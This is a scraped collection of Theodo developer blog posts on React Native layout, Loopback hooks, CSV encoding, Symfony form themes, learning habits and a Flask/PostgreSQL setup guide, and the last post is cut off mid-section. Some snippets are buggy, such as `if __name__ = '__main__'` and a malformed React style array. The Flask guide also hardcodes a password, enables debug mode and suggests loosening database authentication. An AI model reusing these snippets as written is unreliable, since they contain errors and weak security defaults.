\t\t\r\n\r\n  \t\t\r\n\t\t\t\tJack Lawrence-Jones\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe basics of positioning are pretty well explained in the official React Native documentation.\nHowever, it only covers simple cases such as centering items or putting one element on top, middle and bottom.\nHere I intend to cover some cases that are quite common but for which I couldn\u2019t find a suitable documentation.\nOne item centered and one on the right, none on the left\nN.B.: All of the following also works the other way around, or with top and bottom instead of left and right if you use flexDirection: column on the container.\nIf you know the width of the item on the right\n\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* Container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n        {/* empty element on the left */}\r\n        <View style={{ width: 100 }} />\r\n        {/* element in the middle */}\r\n        <View style={styles.box} />\r\n        {/* element on the right */}\r\n        <View style={[styles.box, { width: 100 }]} />\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  box: {\r\n    backgroundColor: '#927412',\r\n    height: 100,\r\n    width:100,\r\n  },\r\n});\r\n\nIf you don\u2019t know the width of the item on the right\n\nIf you don\u2019t know the width of the element on the right, you can still wrap every item in another View.\nLeft and right wrappers will take all the available space, leaving the middle one centered.\nThe left wrapper will be empty.\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* Container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n\r\n        {/*  empty wrapper */}\r\n        <View style={{\r\n          flexDirection: 'row',\r\n          flex: 1,\r\n        }} />\r\n\r\n        {/* element in the middle */}\r\n        <View style={{\r\n          flexDirection: 'row',\r\n          justifyContent: 'center',\r\n        }}>\r\n          <View style={styles.box} />\r\n        </View>\r\n\r\n        {/*  element on the right with a different size */}\r\n        <View style={{\r\n          flexDirection: 'row',\r\n          flex: 1,\r\n          justifyContent: 'flex-end',\r\n        }}>\r\n          <View style={[styles.box, { width: 22 }]} />\r\n        </View>\r\n\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  box: {\r\n    backgroundColor: '#927412',\r\n    height: 100,\r\n    width: 100,\r\n  },\r\n});\r\n\nGrouping items\n\nReact native still misses margin: auto which is useful for grouping items \u2013 you can follow the state of the issue here.\nMeanwhile what we can do is adding elements with a flex: 1 property to make them fill the space between blocks.\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n        {/* element on the left */}\r\n        <View style={styles.box} />\r\n        {/* space */}\r\n        <View style={{ flex: 1 }} />\r\n        {/* elements in the 'middle' */}\r\n        <View style={styles.box} />\r\n        <View style={styles.box} />\r\n        {/* space */}\r\n        <View style={{ flex: 1 }} />\r\n        {/* elements on the right */}\r\n        <View style={styles.box} />\r\n        <View style={styles.box} />\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  box: {\r\n    backgroundColor: '#927412',\r\n    height: 50,\r\n    marginLeft:2,\r\n    marginRight:2,\r\n    width:50,\r\n  },\r\n});\r\n\nYou can also add the property directly to your elements:\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n        {/* element on the left */}\r\n        <View style={[styles.box], { flex: 1 }} />\r\n        {/* elements in the 'middle' */}\r\n        <View style={styles.box} />\r\n        <View style={[styles.box], { flex: 1 }} />\r\n        {/* elements on the right */}\r\n        <View style={styles.box} />\r\n        <View style={styles.box} />\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tLoopback is a node framework based on Express which provides the CRUD to accelerate high value features creation. However, these basic functions may not answer to your needs or partially. For example, you might want to send a mail to the owner of an object when you save it, or update another related object.\nHooks can, and will, help you achieving this.\nWhat\u2019s a hook and its application cases?\nUsing hooks has the following advantages:\n\nDRY principle, only one hook declaration instead of several function calls\nUncoupling\nSeparate trade logic from program requirements\n\nA hook is a special event handler. It is bound to events of the framework or program you are using. As such, it is used to alter, augment or replace the behavior of the target.\nYou should use hooks to perform systematic operations such as:\n\nmail sending\ndata sanitization (formatting, filtering\u2026)\nlogging\nsecurity checks (encoding, decoding, signing\u2026)\n\nCloser look and examples\nIf several hooks are attached to the same event, they are executed one after the other in the order of their declaration.\nLoopback gives access to three types of hooks: connector, remote and operation.\nConnector hooks\nIf you don\u2019t know what a connector is in Loopback, I suggest you read this.\n\nThere are two of them:\n\n'before execute'\n'after execute'\n\nThe first is called before you make use of a connector, the second when you receive the response from it.\nYou must always finish your hook by calling next() or ctx.end(), if you don\u2019t, your server will hang. Using next() goes to the next observer whereas ctx.end() ends the observed event. You can see it in the schema on the right.\nThis category of hooks can be used to log access and queries to your database. Another application would be the formatting of the input/output of your calls to a remote API. For instance, I used the after execute to catch 5XX errors of an API before they are caught and rewritten by a firewall:\nmyRestConnector.observe('after execute', function(ctx, next) {\r\n  if (/^5/.test(ctx.res.statusCode)) {\r\n    var error = new Error();\r\n    error.status = 400;\r\n    return ctx.end(error, null)\r\n  }\r\n  return next();\r\n});\r\n\nRemote hooks\n\nbeforeRemote()\nafterRemote() and afterRemoteError(), only one of these two is called after a remote.\n\nYou can use those to do security checks, for example verify access rights, to sanitize your remote input or whitelisting your output. Mostly, it comes handy when the built-in remotes of Loopback do not meet your needs.\nWild cards are allowed in the remote name so you can bind a handler to a set of remotes.\nExpress\nSince Loopback is built on express app.use() is available. It is the easiest way to bind a single handler to remotes with a similar path, but attached to different models.\napp.use('/\\*/stats', function (req, res, next) {\r\n  console.log(\"I match /aModelWithStats/stats and /anotherModelWithStats/stats\");\r\n  return next();\r\n});\r\n\nOperation hooks\nThese hooks are directly related to built-in functions of Loopback such as save, delete or find.\nThey are useful when you need to update relations of a model you just saved, or to log access and modifications on some instance and then warn the owner by mail.\nThe documentation is quite exhaustive. However I would like to underline that afterInitialize is different from the other operation hooks since it is synchronous. So be careful not to write a heavy function for this handler.\nThe following example sends a mail if a new instance of MyModel is saved.\nMyModel.observe('after save', function(ctx, next) {\r\n  if (ctx.instance && ctx.isNewInstance) {\r\n    let myMessage = { content: 'this is some badass content' };\r\n    myMailingService.send(myMessage);\r\n  }\r\n  return next();\r\n}\r\n\nConclusion\nI hope this article helped you understand the added value of hooks and that it will give you tools to improve the overall quality of your project.\nIf you have any question, or remarks about usage, please share them in the comments section below!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGabriel Andrin\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nAs a developer, I find exciting and captivating to discover a new technology or to learn a new language. But how to do it effectively? \nHere are few tips you can try when beginning a project on a new technology :\n\nUnderstand the structure: learning how functionalities and roles are separated and work together will help you to know how to add functionalities and where in your project. If you can highlight the architectural patterns and understand on which one the technology is built, you will really see the structure of it.\u00a0\nLearn how to write properly\u00a0what you want to implement. You can \u00a0check some previous PR of another project working on the same technology. That way, you will see how to add your own contribution to the structure.\nIdentify the ninjas:\u00a0Wether they are part of your company\u00a0or someone to follow online, identify the experts in the technology you want to master. You will benefit from their knowledge.\nBe curious: do not let dark areas you do not know in your project. Try to have a good overview of all your project without going into details. Many technologies have well structured tree project. Even if you don\u2019t use some parts of the project they are here for a reason. Do not hesitate to ask your teammates, they know things !\nFind a mentor:\u00a0if you\u2019re lucky enough to know people\u00a0more experienced, don\u2019t hesitate to pair-program with them. That way you will understand how they\u00a0think this technology and how they\u00a0handle the constraints of it.\nDraw the data flow: when you start to have a good idea of how your project is built, try to draw the data flow of what come in and out of your project. By doing so, you will understand how your program reacts to an event or a user input.\nUse a debugger:\u00a0a debugger will allow you to stop your program almost everywhere and to check the state of the data that is being processed. You can run your program instructions by instructions, understanding what truly does your code.\nRead unit tests: \u00a0unit tests are meant to validate that each step of your software worked as designed. You will see what each part is supposed to have as input and what it is expected to return.\nWrite automated tests:\u00a0writing automated tests will help you greatly to understand how the code you write works and also what it\u00a0needs to be able to work correctly.\nMake your code crash: this may seem odd, but when you just finished a new functionality, try to make it endure different inputs. You will see the full potential of what you just wrote, and if it crashes, ask yourself why and try to understand the limits of the mechanisms you used. You will learn about the side effects of the technology and its assets. The best way to do so is to write unit tests, because it allows you to test each part of your code separately.\n\nHere are some articles that helped me discover new technologies on my projects:\nRedux (thanks Nicolas Boutin for these amazing articles ;))\n\nYou might not need Redux\n\n\nA cartoon intro to Redux\n\n\nSagas in Redux\n\nSymfony\n\nThe big picture\n\n\nConfigure Xdebug and PhpStorm for a Vagrant project in 5 minutes\n\nJavascript\n\nKeep calm and love Javascript unit test\n\n\u00a0\nFeel free to add your own gold nuggets articles \ud83d\ude09\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCharles Parent\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOne week ago, our production server was down for a few seconds because the command supervisorctl reload had restarted the server. \nThus, I made some research to prevent the command to be run again with the reload option.\nThe first clue Stack Overflow gave me, was to create a new binary file with the name of this command and to change my path variable to override the native one. This has side effects: your binary files can be used by other scripts that you don\u2019t know of, or worse, you can introduce security breaches by change the the user\u2019s rights of your binary file \u2026 Moreover, this solution let you only override the whole command.\nFinally, aliases saved my life (or at least, my server\u2019s life).\nTo override a command, in your .bashrc file, create a function with the exact same name. For instance if you want to make fun of one of your colleagues, you can do: \n\nMore seriously, you can test the argument given to your command and specify different behaviours: and override the option(s) you want to:\n\nIf your command works with flags, you should use getopts, which have a nicer syntax.\nWith this trick you can prevent users to run --force, --rf and some other dangerous options on your production servers. But remember, as the joke shows, it\u2019s just a safeguard, not a real security.\nPlease feel free to share your tips as well!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAurore Malherbes\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tCSV is great, especially to export or import\u00a0table-like data into your system. It is plain-text and it can also be opened with Microsoft Excel and be edited by almost anyone, even non technical people. But, despite all those advantages, the use of CSV that has been edited with Excel comes with a massive drawback: if your file contains non ASCII characters, you enter what I personally call the encoding hell.\nSome context\nAs a french company, we deal on a regular basis with non ASCII characters like \u00e9\u00e8\u00ea\u00e0\u00e7 and so on. We were developing a web application where our client needed to import data using CSV files. The files were to be modified by non technical personnel using Microsoft Excel for Windows (2007 version) and we couldn\u2019t change that. The application backend was coded using NodeJS and the Loopback framework.\nSo we developed the CSV importer and data looking like this in Excel:\n\nEnded up like this in the database:\n\nNeedless to say that our client was not satisfied with the presence of this character: \ufffd.\nWhat caused this problem\nAfter a few research, we discovered that Excel do not encode CSV files in good old UTF-8 when saving them.\nFact is that Excel for Windows encode CSV in ISO-8859-1 and Excel for OSX\u00a0in\u00a0macintosh encoding. Unfortunately, it seems that this cannot be overridden in Excel for now, so we couldn\u2019t ask our client to change his configuration. We had to handle this within the application.\nHow we solved it\niconv-lite is a great javascript library for dealing with encoding conversions. After having figured out from which encoding decode our files, we only had to add this code to our CSV importer, right before the CSV parsing:\niconv = require('iconv-lite');\r\n\r\n...\r\n\r\noriginalFile = fs.readFileSync(filename, {encoding: 'binary'});\r\ndecodedFile = decode(originalFile, 'iso88591');\r\n\nWe knew that our client would\u00a0only use Excel for Windows, so we didn\u2019t bother implement an OSX compatible solution, but if you need to create a multi OS importer, you could use a trick like this:\n\r\noriginalFile = fs.readFileSync(filename, {encoding: 'binary'});\r\ndecodedFile = decode(originalFile, 'iso88591');\r\nif(decodedFile.indexOf('\u00e9') < 0) {\r\n  decodedFile = decode(originalFile, 'macintosh');\r\n}\r\n\nHere, we know that after decoding we should find the character \u201c\u00e9\u201d in the header of the CSV (in the \u201cCat\u00e9gorie\u201d and \u201cP\u00e9riode\u201d columns). So we try first the Windows compatible decoding and if it fails (if we do not find the \u201c\u00e9\u201d), we try the OSX compatible one.\nConclusion\nYay! You escaped the encoding hell! If you want to learn\u00a0more about CSV import in Loopback, you should certainly read this\u00a0great article about user-friendly transactional CSV import.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGeorges Biaux\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBesides side projects, technical watch (reading articles, watching talks, listening to podcast)\u00a0is the best way to discover new technologies, to learn useful technical tips, to improve your methodology and so on.\nTechnical Watch is like Devops: you have to be equipped to be efficient. The very first thing you should do to start is to install a tool like Pocket. With the app and the chrome extension you can stash and read articles everywhere.\n\nNow, you have to find sources. Here are some examples, but feel free to ask around you what people are reading:\n\nDownload Materialistic\u00a0which is the Hackernews app. You can screen the thirty first articles of the Catch Up section which gathers the most popular articles within the 24 hours. Same approach could be done with Reddit and once you\u2019ve chosen your topics.\n\n\nCreate a Twitter account and follow the main contributor your favorite language or of a library you like. Follow the awesome speaker you saw at the last meetup or your colleague who always knows the new on-trend tool (see below). Or add my two favorite: Addy Osmani working on Google Chrome and the Dev.to blog. If someone pollutes your feed with a lot of useless information, don\u2019t hesitate to get rid of him. A messy feed is an inefficient feed.\u00a0\nNetwork\u00a0with other developers : talk with your colleagues about their side-projects and enjoy meetups like HumanTalks\u00a0to always discover new subjects or specialized meetup like ReactJS.\nRead blogs from the major tech company like Airbnb, Github, Instagram, Uber\u2026 You can either follow their Twitter accounts or subscribe to their RSS feed.\n\n\nSubscribe to technical newsletters like JS weekly or DevOps weekly.\n\nThen you should create your own routine. Book 10 minutes each day to source content. For instance, I do that during breakfast. If it takes less than 30 seconds to read, read it now, if it takes longer stash it in our favorite app. Next find a daily slot to read the articles you\u2019ve selected. The 20 minutes in the subway are much more useful since I\u2019ve started this routine!\nIt\u2019s important to regenerate your sources often otherwise the number of interesting articles will drop dramatically.\nThus, every two months, look at the list of people you\u2019re following on Twitter, and remove the one whom you haven\u2019t read a tweet within the month.\nIf you haven\u2019t found any interesting articles on Hackernews since 15 days, switch to Reddit.\nFinally if you want to look deeper into a specific subject, books could be your best ally. That\u2019s how Benjamin, the CTO of Theodo, learnt how to code in Ruby and that\u2019s how I\u2019m learning how to work effectively with legacy code.\nAnd what about you? I would be glad to learn what your tips are to do efficient technical watch!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAurore Malherbes\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou want to make a nice, elegant and modern form using the new design standards of Material Design, I\u2019ll try to give you a 5-minutes way to do so with Materialize, a JQuery library, based on these guidelines.\nGet Started\nGet the assets from Materialize\u00a0and add it in web directory of your project following Symfony best practices\u00a0: in fonts, Roboto, in CSS, materialize.min.css, in JS, materialize.min.js.\u00a0Prefer minified version to improve loading performance.\nRun assets:install command.\nImport\u00a0assets in your project templates\nYou need to import assets into your Twig. At the beginning of your base.html:\n{% block stylesheets %}\r\n  <link href=\"{{ asset('css/materialize.css') }}\" rel=\"stylesheet\"/>\r\n  <link href=\"{{ asset('css/your_form_theme.css') }}\" rel=\"stylesheet\"/>\r\n{% endblock %}\nAt the end of your\u00a0base.html\n{% block javascripts %}\r\n  <script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-2.1.1.min.js\"></script>\r\n  <script type=\"text/javascript\" src=\"{{ asset('js/materialize.min.js') }}\"></script>\r\n{% endblock %}\nYou need JQuery and materialize.min.js if you use Materialize Javascripts animations .\nCreate your Materialize form theme\nSymfony use form themes to standardize display from components\nYou need to create your Materialize form theme to transform your form design from a basic to an elegant one. You can use this Gist I created for you. You need to create it into app/Ressources/views folder. Once it\u2019s done, update your Twig configuration in app/config/config.yml:\ntwig:\r\n  form_themes:\r\n  - 'views/materialize_layout.html.twig'\nAnd that\u2019s it! You have built an elegant, modern and responsive form with very nice TextInputs, DatePicker or\u00a0SelectList.\n\nI look forward to reading\u00a0your feedbacks and your suggestions or issues on the form theme repository.\nTips\nYou can update primary, secondary and background colors to adapt your form to your own visual identity by editing _variables.scss file in components folder. You\u2019ll need Gulp to compile and minify CSS files.\nUse grids of Materialize\u00a0to display multiple fields on the same row depending on device width.\nIf you want to customise a specific form instead of all the forms of your app, follow the Symfony documentation and import your new form theme by adding this line at the beginning of the corresponding template:\n{% form_theme form 'materialize_layout.html.twig'}\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Boutin\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI have lately been attempting to develop a web app linked to a PostgreSQL database and despite all the tutorials available through the Internet, it has not been an easy task. So I have decided to gather all the sources or tips I have used to solve the errors I encountered and to provide with a boilerplate to help setting up a Flask app.\nThe objective of this post is to make it easier and faster for people to start using Flask and PostgreSQL.\nIf you have encountered any error in a related project please comment about it and explain how you solved it or provide any source that helped you.\nBy the end of this article you will, first, know that you are not alone encountering errors, second, find some answers to help you.\nSystem\nThe code snippets have been tested with the following versions:\n\nFlask 0.12\nPostgreSQL 9.5\nPython 2.7\nUbuntu 16.04\n\nPlease consider that when you reuse them.\nWhat is needed to build the app?\nFlask is a Python web developpement framework to build web applications. It comes with jinja2, a templating language for Python, and Werkzeug, a WSGI utility module.\nPostgreSQL is an open source relational database system which, as its name suggests,\nuses SQL.\nSQLAlchemy is an Object Relational Mapper (ORM), it is a layer between\nobject oriented Python and the database schema of Postgres.\nAlembic is a useful module to manage migrations with SQLAlchemy in Python. Migrations occur when one wants to change the database schema linked to the application, like adding a table or removing a column from a table. It can also be used to write or delete data in a table. Alembic enables developers not to manually upgrade their database and to easily revert any change: migrations go up and down. It is also useful to recreate databases from scratch, by following the migration flow.\nEven if you don\u2019t use them directly, you will have to install libpq-dev, to communicate with Postgres backend, and psycopg2, a libpq wrapper in Python.\nSo many things, but how to use each of them?\nNow, let\u2019s see how to connect the previous modules and software together. The good news is that almost everything is managed by itself.\n\n\nCreate an app.py file which will define and run the application. It is the entry point of the application. With Flask, it is as easy as importing the Flask class and initialize an instance with:\napp = Flask(__name__)\r\n\n\n\nAdd:\nif __name__ = '__main__':\r\n    app.run()\r\n\nin app.py file and then enter python app.py in a terminal to get your app running. Easy, but it does not do many things yet\u2026\n\n\nSo far, if you want something else than an error 404 when accessing the application, create the first route which will return Hello World! at the root of the application. To do so, add the following piece of code after the definition of the application instance.\n@app.route('/')\r\ndef main():\r\n    return 'Hello World!'\r\n\n\n\nSet the application in debug mode so that the server is reloaded on any code change and provides detailed error messages, otherwise it should be restarted manually. In app.py, before app.run():\napp.config['DEBUG'] = True\r\n\n\n\nInitialize a database object from Flask-Alchemy with db = SQLAlchemy() to control the SQLAlchemy integration to the Flask applications. You might put it directly in the app.py or in another file usually called models.py.\nfrom flask_sqlalchemy import SQLAlchemy\r\n\r\ndb = SQLAlchemy()\r\n\r\n# define your models classes hereafter\r\n\n\n\nConfigure Flask by providing the PostgreSQL URI so that the app is able to connect to the database, through : app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://DB_USER:PASSWORD@HOST/DATABASE' where you have to replace all the parameters in capital letters (after postgresq://). Find out more on URI definition for PostgreSQL here.\nBack in app.py:\nPOSTGRES = {\r\n    'user': 'postgres',\r\n    'pw': 'password',\r\n    'db': 'my_database',\r\n    'host': 'localhost',\r\n    'port': '5432',\r\n}\r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://%(user)s:\\\r\n%(pw)s@%(host)s:%(port)s/%(db)s' % POSTGRES\r\n\n\n\nYou also have to connect your SQLAlchemy object to your application with db.init_app(app),\nto make sure that connections will not leak. To do so, you first have to import db in app.py.\nfrom models import db\r\n\r\n# ...app config...\r\ndb.init_app(app)\r\n\n\n\nYour models.py file should include the definition of classes which define the models of your database tables. Such classes inherit from the class db.Model where db is your SQLAlchemy object. Further, you may want to define models implementing custom methods, like an home-made __repr__ or a json method to format objects or export it to json. It could be helpful to define a base model which will lay the ground for all your other models:\nclass BaseModel(db.Model):\r\n\"\"\"Base data model for all objects\"\"\"\r\n__abstract__ = True\r\n    # define here __repr__ and json methods or any common method\r\n    # that you need for all your models\r\n\r\nclass YourModel(BaseModel):\r\n\"\"\"model for one of your table\"\"\"\r\n    __tablename__ = 'my_table'\r\n    # define your model\r\n\n\n\nFinally, you have to add a manage.py file to run database migrations and upgrades using flask_script and flask_migrate modules with:\nfrom flask_script import Manager\r\nfrom flask_migrate import Migrate, MigrateCommand\r\nfrom app import app, db\r\n\r\n\r\nmanager = Manager(app)\r\nmigrate = Migrate(app, db)\r\n\r\nmanager.add_command('db', MigrateCommand)\r\n\n\n\n\nYou want to be abble to run the migrations command from the manager, these last lines are needed in manage.py:\nif __name__ == '__main__':\r\n    manager.run()\r\n\n\n\nInstalling PostgreSQL & code samples\nInstall Postgres and other requirements.\nsudo apt-get update\r\nsudo apt-get install postgresql postgresql-contrib libpq-dev\r\npip install psycopg2 Flask-SQLAlchemy Flask-Migrate\r\n\nOptionnaly, if you want to modify some parameters in postgres, like the password of the user:\nsudo -i -u postgres psql\r\npostgres=# ALTER USER postgres WITH ENCRYPTED PASSWORD 'password';\r\n\nThen, still in psql, create a database \u201cmy_database\u201d:\npostgres=# CREATE DATABASE my_database;\r\n\nHere is what your code could look like, the previous paragraphs should enable you to understand the role of each line, and even better you should be able to modify it without breaking your app \ud83d\ude09 e.g. if you prefer defining your db object in app.py.\nOverall, your application folder should look like:\n    application_folder\r\n    \u251c\u2500 app.py\r\n    \u251c\u2500 manage.py\r\n    \u2514\u2500 models.py\r\n\napp.py file, used to run the app and connect the database to it.\nfrom flask import Flask\r\nfrom models import db\r\n\r\napp = Flask(__name__)\r\n\r\nPOSTGRES = {\r\n    'user': 'postgres',\r\n    'pw': 'password',\r\n    'db': 'my_database',\r\n    'host': 'localhost',\r\n    'port': '5432',\r\n}\r\n\r\napp.config['DEBUG'] = True\r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://%(user)s:\\\r\n%(pw)s@%(host)s:%(port)s/%(db)s' % POSTGRES\r\ndb.init_app(app)\r\n\r\n@app.route(\"/\")\r\ndef main():\r\n    return 'Hello World !'\r\n\r\nif __name__ == '__main__':\r\n    app.run()\r\n\nmodels.py file to define tables models.\nfrom flask_sqlalchemy import SQLAlchemy\r\nimport datetime\r\n\r\ndb = SQLAlchemy()\r\n\r\nclass BaseModel(db.Model):\r\n    \"\"\"Base data model for all objects\"\"\"\r\n    __abstract__ = True\r\n\r\n    def __init__(self, *args):\r\n        super().__init__(*args)\r\n\r\n    def __repr__(self):\r\n        \"\"\"Define a base way to print models\"\"\"\r\n        return '%s(%s)' % (self.__class__.__name__, {\r\n            column: value\r\n            for column, value in self._to_dict().items()\r\n        })\r\n\r\n    def json(self):\r\n        \"\"\"\r\n                Define a base way to jsonify models, dealing with datetime objects\r\n        \"\"\"\r\n        return {\r\n            column: value if not isinstance(value, datetime.date) else value.strftime('%Y-%m-%d')\r\n            for column, value in self._to_dict().items()\r\n        }\r\n\r\n\r\nclass Station(BaseModel, db.Model):\r\n    \"\"\"Model for the stations table\"\"\"\r\n    __tablename__ = 'stations'\r\n\r\n    id = db.Column(db.Integer, primary_key = True)\r\n    lat = db.Column(db.Float)\r\n    lng = db.Column(db.Float)\r\n\nmanage.py file to run migrations.\nfrom flask_script import Manager\r\nfrom flask_migrate import Migrate, MigrateCommand\r\nfrom app import app, db\r\n\r\n\r\nmigrate = Migrate(app, db)\r\nmanager = Manager(app)\r\n\r\nmanager.add_command('db', MigrateCommand)\r\n\r\n\r\nif __name__ == '__main__':\r\n    manager.run()\r\n\nFinally, run database migrations and upgrades. In a terminal:\n\npython manage.py db init\n This will create a folder called migrations with alembic.ini and env.py files and a sub-folder migrations which will include your future migrations. It has to be run only once.\n\npython manage.py db migrate\n Generates a new migration in the migrations folder. The file is pre-filled based on the changes detected by alembic, edit the description message at the beginning of the file and make any change you want.\n\npython manage.py db upgrade\n Implements the changes in the migration files in the database and updates the version of the migration in the alembic_version table.\nCommon Mistakes \u2013 and Some Solutions\nCould not connect to server\nsqlalchemy.exc.OperationalError: (psycopg2.OperationalError) could not \r\n  connect to server: Connection refused\r\nIs the server running on host \"localhost\" (127.0.0.1) and accepting\r\nTCP/IP connections on port 5432?\r\n\nThe previous error stands when the declared host is \u201clocalhost\u201d and the port is \u201c5432\u201d but it could be anything else depending on your context. It\u2019s likely your PostgreSQL server is not running or not allowing the chosen connection protocol. See PostgreSQL documentation about Client Connection Problems.\n\n\ncheck that PostgreSQL server is running: ps -aux | grep \"[p]ostgres\" or service postgresql status\n\n\nstart it if needed: /etc/init.d/postgresql start or service postgresql start \u2013 more information in the documentation.\n\n\nif needed, modify the the config file indicated in the output of ps -aux, likely /etc/postgresql/X.X/main/postgresql.conf where X.X is your PostgreSQL version, to accept TCP/IP connections. Set listen_addresses='localhost'.\n\n\nand check the pg_hba.conf file in the same repository, to make sure connections from localhost are allowed.\n\n\nrestart PostgreSQL server: /etc/init.d/postgresql restart\n\n\nNo password supplied\nOperationalError: fe_sendauth: no password supplied\nTo solve this issue, several options:\n\n\nChange the uri of the database to something that does not require secured authentication, like : postgresql://database_name which changes the type of connection to the database.\n\n\nActually read the error message and provide a password, passing an empty string '' if your database user has no password will not work.\n\n\nModify the connection rights associated with your database user in postgres configuration file named pg_hba.conf lileky located in /etc/postgresql/X.X/main where X.X is your PostgreSQL version. Writing something like:\n\n\nhost  all  postgres  127.0.0.1  md5\n\n\nEverything about the pg_hba.conf file here.\n\n\nClass does not have a table or tablename specified\nInvalidRequestError: Class does not have a table or tablename specified \r\nand does not inherit from an existing table-mapped class\r\n\nThis occurs when trying to define a base model. This is actually an abstract class, never instantiated as such but inherited, the parameter __abstract__ = True has to be set when defining the base model class so that SQLAlchemy does not try to create a table for this model as explained here.\nclass BaseModel(db.Model):\r\n    __abstract__ = True\r\n\nError when calling metaclass bases\nTypeError: Error when calling the metaclass bases\r\nCannot create a 